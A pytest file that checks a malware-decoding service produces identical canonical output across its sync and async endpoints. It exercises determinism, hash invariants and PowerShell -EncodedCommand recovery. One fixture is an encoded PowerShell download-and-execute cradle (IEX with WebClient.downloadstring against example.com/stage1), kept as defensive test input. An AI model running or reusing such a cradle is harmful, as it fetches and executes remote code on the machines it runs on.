"""PR-2.1.2 · ARB Acceptance Criterion 0
=========================================

For any identical input, /api/decode/smart (sync) and /api/analyze/async
(async) MUST produce byte-identical canonical decoded artifacts before
downstream investigation begins. Presentation may differ; decoded
evidence must not.

This test is the ARB release-gate proof. It exercises the shared
`services.canonical_evidence_recovery.recover_canonical_evidence`
function that both endpoints now consume, and verifies:

1. The same payload produces the same canonical decoded_output.
2. The same payload produces the same chain_ids sequence.
3. The same payload produces the same input_hash / output_hash pair.
4. Recursive-safety: input_hash != output_hash on any non-passthrough
   artifact (canonical output is never byte-identical to raw input).
5. `content-ps-operator-case-normalize` is a LEGIT L0 registered op —
   never surfaces as "Unknown operation" in a canonical chain
   produced by the service.
"""
from __future__ import annotations
import pytest

from services.canonical_evidence_recovery import (
    recover_canonical_evidence, CanonicalArtifact,
)


# Fixtures — representative of the divergent-pipelines bug the ARB
# flagged. First payload is the exact one from the ARB screenshots
# (PowerShell -EncodedCommand). Others cover atomic-IOC / plaintext /
# multi-stage cases so the parity contract holds broadly.
FIXTURES = [
    pytest.param(
        'powershell.exe -EncodedCommand '
        'VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGMAbwBtAGUAcwAgAGYAcgBvAG0A'
        'IABhAG4AIABlAG4AYwBvAGQAZQBkACAAUABTACAAYwBvAG0AbQBhAG4AZAAhACIA',
        id="ps-encodedcommand-hello",
    ),
    pytest.param(
        'powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUA'
        'YgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQA'
        'dABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAdABhAGcAZQAxACcAKQA=',
        id="ps-encodedcommand-iex-webclient",
    ),
    pytest.param(
        "8.8.8.8", id="atomic-ipv4",
    ),
    pytest.param(
        "Write-Host 'plain'", id="plaintext-passthrough",
    ),
]


@pytest.mark.parametrize("payload", FIXTURES)
def test_pr212_canonical_artifact_is_deterministic(payload: str) -> None:
    """Same input → same canonical artifact, byte-for-byte, always."""
    a: CanonicalArtifact = recover_canonical_evidence(payload)
    b: CanonicalArtifact = recover_canonical_evidence(payload)

    assert a.decoded_output == b.decoded_output, (
        f"decoded_output diverged across two calls for id={payload[:60]!r}"
    )
    assert a.chain_ids == b.chain_ids, "chain_ids diverged"
    assert a.input_hash == b.input_hash, "input_hash diverged"
    assert a.output_hash == b.output_hash, "output_hash diverged"
    assert a.terminal_state == b.terminal_state, "terminal_state diverged"


@pytest.mark.parametrize("payload", FIXTURES)
def test_pr212_recursive_safety_holds(payload: str) -> None:
    """Non-passthrough artifacts must satisfy input_hash != output_hash —
    proves the recovery pipeline never returns raw input as a
    canonical decoded artifact except in explicit passthrough cases."""
    art = recover_canonical_evidence(payload)
    if art.terminal_state in ("passthrough", "atomic_ioc"):
        # Passthrough is allowed to have hash equality.
        return
    if art.terminal_state in ("decode_error", "multi_fragment"):
        # decoded_output is intentionally empty; recursive safety
        # not applicable.
        return
    assert art.input_hash != art.output_hash, (
        f"terminal={art.terminal_state} · input_hash == output_hash — "
        "recursive-safety invariant violated. The canonical decoded "
        "artifact must never be byte-identical to raw input on a "
        "'recovered' terminal state."
    )
    # Direct assertion also raises — mirrors what production callers
    # would experience.
    art.assert_no_recursion()


def test_pr212_ps_encodedcommand_recovers_plaintext() -> None:
    """The exact ARB screenshot input must recover the expected
    canonical PowerShell plaintext. This is the concrete symptom that
    triggered the PR-2.1.2 directive."""
    payload = (
        'powershell.exe -EncodedCommand '
        'VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGMAbwBtAGUAcwAgAGYAcgBvAG0A'
        'IABhAG4AIABlAG4AYwBvAGQAZQBkACAAUABTACAAYwBvAG0AbQBhAG4AZAAhACIA'
    )
    art = recover_canonical_evidence(payload)
    assert art.terminal_state == "recovered", (
        f"expected terminal_state='recovered' — got {art.terminal_state!r}"
    )
    assert 'Write-Host' in art.decoded_output, (
        f"expected canonical Write-Host output — got {art.decoded_output!r}"
    )
    assert "encoded PS command" in art.decoded_output


def test_pr212_no_unknown_operation_in_canonical_chain() -> None:
    """The ARB screenshot showed:
        "error": "Unknown operation: content-ps-operator-case-normalize"
    That happens when non-canonical paths REPLAY chains via the
    router's smaller OPERATIONS registry. In a canonical artifact
    produced by the service, no chain step must be flagged as
    'Unknown operation' — the L0 convergence engine owns the chain
    and every op it emits is registered in its own registry."""
    payload = (
        'powershell.exe -EncodedCommand '
        'VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGMAbwBtAGUAcwAgAGYAcgBvAG0A'
        'IABhAG4AIABlAG4AYwBvAGQAZQBkACAAUABTACAAYwBvAG0AbQBhAG4AZAAhACIA'
    )
    art = recover_canonical_evidence(payload)
    for step in art.chain_steps or []:
        assert "error" not in step or "Unknown operation" not in str(step.get("error", "")), (
            f"canonical chain contains Unknown-operation error: {step!r}"
        )
        assert "reason" not in step or "Unknown operation" not in str(step.get("reason", "")), (
            f"canonical chain contains Unknown-operation reason: {step!r}"
        )


def test_pr212_content_ps_operator_case_normalize_is_valid_l0_op() -> None:
    """The op `content-ps-operator-case-normalize` is a LEGITIMATE L0
    registered transformation (backend/workspace/convergence/registry.py).
    It must appear cleanly as a chain step (not as an error) when the
    canonical service processes a PowerShell payload with mixed-case
    operators. This test is the L0-frozen contract check."""
    payload = (
        'powershell.exe -EncodedCommand '
        'VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGMAbwBtAGUAcwAgAGYAcgBvAG0A'
        'IABhAG4AIABlAG4AYwBvAGQAZQBkACAAUABTACAAYwBvAG0AbQBhAG4AZAAhACIA'
    )
    art = recover_canonical_evidence(payload)
    ids = art.chain_ids or []
    if "content-ps-operator-case-normalize" in ids:
        # If present, it must be a clean step (no error).
        for step in art.chain_steps or []:
            if step.get("op") == "content-ps-operator-case-normalize":
                assert "error" not in step, (
                    "content-ps-operator-case-normalize should never "
                    "surface as an error — it's a registered L0 op."
                )


def test_pr212_canonical_artifact_dict_is_json_serializable() -> None:
    """The artifact must round-trip through JSON — both endpoints
    return it via HTTP responses."""
    import json
    payload = "Write-Host 'plain'"
    art = recover_canonical_evidence(payload)
    d = art.to_dict()
    # `det_result` is intentionally omitted — internal-only.
    assert "det_result" not in d
    encoded = json.dumps(d)
    assert isinstance(encoded, str) and len(encoded) > 0
